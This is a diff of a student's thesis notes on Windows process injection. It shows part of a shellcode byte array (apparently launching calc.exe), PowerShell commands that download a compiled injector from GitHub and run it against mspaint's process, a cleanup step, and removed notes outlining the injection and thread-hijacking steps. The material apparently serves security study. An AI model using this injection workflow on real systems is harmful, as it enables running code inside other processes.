@@ -27,67 +27,21 @@ unsigned char buf[] =
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
                                                                                                                                                                                                                                             
-┌──(kali㉿kali)-[~]
-└─$ 
 
 
-
-pau@pau-PC:~/Escritorio/Master/TFM/ScriptsComandos$ x86_64-w64-mingw32-gcc -o ./exec/shellcodeInjection.exe shellcodeInjection.c 
-shellcodeInjection.c: In function ‘main’:
-shellcodeInjection.c:14:19: warning: initialization of ‘DWORD’ {aka ‘long unsigned int’} from ‘void *’ makes integer from pointer without a cast [-Wint-conversion]
-   14 |     DWORD dwPID = NULL, dwTID = NULL;
-      |                   ^~~~
-shellcodeInjection.c:14:33: warning: initialization of ‘DWORD’ {aka ‘long unsigned int’} from ‘void *’ makes integer from pointer without a cast [-Wint-conversion]
-   14 |     DWORD dwPID = NULL, dwTID = NULL;
+x86_64-w64-mingw32-gcc -o ./exec/shellcodeInjection.exe shellcodeInjection.c 
 
 
 
 
+mspaint
+Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/shellcodeInjection.exe -OutFile "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
+& "$env:USERPROFILE\Downloads\shellcodeInjection.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
 
 
-
-
-ejecutar en windows con el PID del proceso que queremos injectar
-
-
-
-MODIFICAR EL CODIGO -> AUNQUE DEJARLO LEGIBLE Y ARGUMENTAR EN LA EXPLICACION QUE SE BUSCA LA ESCALADA DE PRIVILEGIOS/PERSISTENCIA, NO LA EVASION
-
-
-
-
-
-
-
-
-
-
-PASOS QUE SIGUE UN ATAUQE DE INYECOIN DE CODIGO ---- TEORIA
-
-1. Attach to, or create a process
-2. Allocate some memoty with that process
-3. Write the memory to the process
-4. Create a thread in the process that will run the code you hve surgically embedded into the process memory
-
-
-ESTOS PASOS SON TEORICOS, Y SON IGUAL PARA SHELLCODE INJECTION QUE PARA DLL INJECTION
-
-
+CLEAN UP
+Remove-Item "$env:USERPROFILE\Downloads\shellcodeInjection.exe"
 
 
 https://www.crow.rip/crows-nest/mal/dev/inject/syscalls
 https://www.youtube.com/watch?v=P1PHRcmPM7c&ab_channel=crow
-
-
----------------------------------------------------
-
-THREAD EXECUTION HICJACKING
-https://www.youtube.com/watch?v=69JINSmgml4&ab_channel=Null
-
-PASOS SEGUN CHAT GPT
-Thread Execution Hijacking:
-
-1 .Identificar un hilo en un proceso existente al que se desea inyectar código.
-2. Suspender el hilo seleccionado.
-3. Reemplazar la memoria del hilo con código malicioso.
-4. Reanudar la ejecución del hilo, lo que ejecutará el código malicioso en el contexto del proceso.
